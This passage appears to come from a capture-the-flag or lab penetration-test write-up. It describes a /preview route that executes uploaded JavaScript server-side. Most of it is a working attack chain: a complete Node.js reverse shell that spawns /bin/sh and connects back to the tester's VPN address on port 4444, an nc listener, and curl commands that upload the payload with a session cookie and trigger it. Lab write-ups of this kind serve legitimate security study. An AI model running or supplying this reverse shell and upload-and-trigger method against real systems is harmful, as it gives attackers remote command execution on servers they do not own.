Testing the preview route for code execution

Previewing shell.js returned {} (an empty module export), which was the tell: the /preview route doesn’t just display .js files, it executes them server-side. I confirmed this against the app logic later, but the behaviour alone pointed to a Node.js code-execution vector via require().

Getting a reverse shell

I identified my VPN (tun0) IP as the callback address:

bash
ip addr show tun0      # 192.168.21.3

I created a Node.js reverse shell, rev.js:

javascript
(function(){
  var net = require("net"),
      cp = require("child_process"),
      sh = cp.spawn("/bin/sh", []);
  var client = new net.Socket();
  client.connect(4444, "192.168.21.3", function(){
    client.pipe(sh.stdin);
    sh.stdout.pipe(client);
    sh.stderr.pipe(client);
  });
})();

Started a listener, uploaded the payload with the authenticated cookie, and triggered it via preview:

bash
nc -lvnp 4444
curl -s -b cookies.txt -F "file=@rev.js" http://192.168.11.200/upload
curl -s -b cookies.txt http://192.168.11.200/preview/rev.js   # detonates it

